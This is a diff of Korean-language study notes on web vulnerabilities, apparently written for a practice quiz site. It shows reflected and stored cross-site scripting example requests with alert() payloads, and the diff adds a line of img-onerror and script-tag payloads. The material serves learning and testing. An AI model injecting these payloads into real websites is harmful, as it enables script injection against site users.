@@ -86,7 +86,7 @@ sql을 예방하기 위한 방법인 prepared statement 중 parse bind execute f
 reflected 크사 공격 예시 : GET /exam16/notice.php?pageIndex=1"><script>alert("xss")</script>&board_id=&sorting=&sotingAd=DESC&startDt=&endDt=&searchType=all&keyword=xss HTTP/1.1
 reflected크사 공격 예시 : GET /exam17/noticeview.php?pageIndex=1&board_id=';}{alert("xss");'&sorting=&sotingAd=DESC&startDt=&endDt=&searchType=all&keyword= HTTP/1.1
 
-stored 크사 공격 예시 게시판:
+##stored 크사 공격 예시 게시판:
 POST /exam20/process/faqProcess.php HTTP/1.1
 Host: quiz.sas.ne.kr
 Content-Length: 649
@@ -127,3 +127,4 @@ Content-Disposition: form-data; name="content"
 <p></p><script>alert("xss");</script>
 ------WebKitFormBoundaryvNc3w5VLMU4OrJW7--
 
+##stored 크사 게시판 html 이용 : <img src="#" onerror="alert('XSS')"> 또는 <script>alert("xss");</script>
